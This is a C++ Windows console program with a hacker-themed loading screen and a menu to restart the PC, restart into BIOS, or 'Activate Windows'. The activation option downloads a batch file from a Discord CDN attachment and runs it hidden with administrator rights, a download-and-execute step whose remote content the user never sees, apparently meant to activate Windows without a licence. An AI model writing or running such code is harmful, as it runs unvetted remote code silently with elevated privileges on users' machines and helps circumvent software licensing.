#include <iostream>
#include <cstdlib>
#include <Windows.h>
#include <Urlmon.h>
#include <conio.h>
#include <ctime>

#pragma comment(lib, "urlmon.lib")

void setColor(int color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}

void showLoadingScreen() {
    system("cls");  // Clear the console screen

    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi);
    int consoleWidth = csbi.dwSize.X;
    int consoleHeight = csbi.dwSize.Y;

    setColor(10); // Light Green
    std::string loadingText = "LOADING...";
    std::cout << std::string((consoleWidth - loadingText.length()) / 2, ' ') << loadingText << std::endl;
    std::cout << std::endl;

    int loadingBarWidth = 30;
    //std::string loadingBar = "[" + std::string(loadingBarWidth, ' ') + "]";
    //std::cout << std::string((consoleWidth - loadingBarWidth) / 2, ' ') << loadingBar << std::endl;
    std::cout << std::endl;

    std::string hackerTexts[] = {
        "Accessing mainframe...",
        "Executing code injection...",
        "Bypassing security protocols...",
        "Decrypting firewall...",
        "Initiating network takeover...",
        "Cracking encryption algorithm...",
        "Establishing backdoor...",
        "Intercepting data packets...",
        "Exploiting vulnerabilities...",
        "Running exploit script..."
    };

    srand(time(0));

    for (int i = 0; i < loadingBarWidth; i++) {
        std::cout << "\r";
        setColor(10);
        std::cout << std::string((consoleWidth - loadingBarWidth) / 2, ' ') << "[";

        for (int j = 0; j < loadingBarWidth; j++) {
            if (j <= i) {
                setColor(10); // Light Green
                std::cout << "=";
            }
            else {
                std::cout << " ";
            }
        }

        std::cout << "]";

        setColor(12); // Light Blue
        std::cout << " " << hackerTexts[i % 10] << std::flush;
        Sleep(200);  // Delay between each progress

        if (i == loadingBarWidth - 1) {
            std::cout << std::endl;
            Beep(750, 500);  // Beep sound to indicate completion
        }
    }

    setColor(7); // Restore default color
    std::cout << std::endl;
}

void showMainMenu() {
    system("cls");  // Clear the console screen

    CONSOLE_SCREEN_BUFFER_INFO csbi;
    GetConsoleScreenBufferInfo(GetStdHandle(STD_OUTPUT_HANDLE), &csbi);
    int consoleWidth = csbi.dwSize.X;

    setColor(12); // Light Red
    std::string title = "HIGH-TECH MENU";
    std::cout << std::string((consoleWidth - title.length()) / 2, ' ') << title << std::endl;
    std::cout << std::endl;

    std::string author = "BY SKGT#2635";
    std::cout << std::string((consoleWidth - author.length()) / 2, ' ') << author << std::endl;
    std::cout << std::endl;

    setColor(13); // Magenta
    std::cout << std::string(consoleWidth, '=') << std::endl;
    std::cout << std::endl;
    setColor(11);
    std::cout << std::string((consoleWidth - 15) / 2, ' ') << " 1. Restart PC" << std::endl;
    std::cout << std::string((consoleWidth - 24) / 2, ' ') << " 2. Restart PC into BIOS" << std::endl;
    std::cout << std::string((consoleWidth - 16) / 2, ' ') << " 3. Activate Windows" << std::endl;
    std::cout << std::string((consoleWidth - 10) / 2, ' ') << " 0. Exit" << std::endl;
    std::cout << std::endl;
    setColor(13);
    std::cout << std::string(consoleWidth, '=') << std::endl;

    setColor(11); // Light Blue
    std::cout << "Enter your choice: ";
    setColor(7);  // Restore default color
}

void restartPC() {
    system("shutdown /r /t 0");
}

void restartPCIntoBIOS() {
    system("shutdown /r /fw");
}

void runWinActr() {
    const char* downloadURL = "https://cdn.discordapp.com/attachments/1092827933414019073/1112610552443842630/winactr.bat";  // Replace with your download link
    const char* batFileName = "winactr.bat";

    HRESULT hr = URLDownloadToFile(NULL, downloadURL, batFileName, 0, NULL);
    if (hr == S_OK) {
        // Run the .bat file silently as administrator
        SHELLEXECUTEINFO execInfo;
        execInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        execInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        execInfo.hwnd = NULL;
        execInfo.lpVerb = "runas";  // Run as administrator
        execInfo.lpFile = batFileName;
        execInfo.lpParameters = "/c";
        execInfo.lpDirectory = NULL;
        execInfo.nShow = SW_HIDE;

        if (ShellExecuteEx(&execInfo)) {
            WaitForSingleObject(execInfo.hProcess, INFINITE);
            CloseHandle(execInfo.hProcess);
        }
        else {
            setColor(12); // Light Red
            std::cout << "Failed to run the .bat file as administrator." << std::endl;
            Sleep(2000);
        }
    }
    else {
        setColor(12); // Light Red
        std::cout << "Failed to download the .bat file." << std::endl;
        Sleep(2000);
    }
}

int main() {
    showLoadingScreen();

    int choice;

    while (true) {
        showMainMenu();
        std::cin >> choice;

        switch (choice) {
        case 1:
            restartPC();
            break;
        case 2:
            restartPCIntoBIOS();
            break;
        case 3:
            runWinActr();
            break;
        case 0:
            return 0;
        default:
            setColor(12); // Light Red
            std::cout << "Invalid choice. Please try again." << std::endl;
            Sleep(2000);  // Pause for 2 seconds before showing the menu again
        }
    }

    return 0;
}
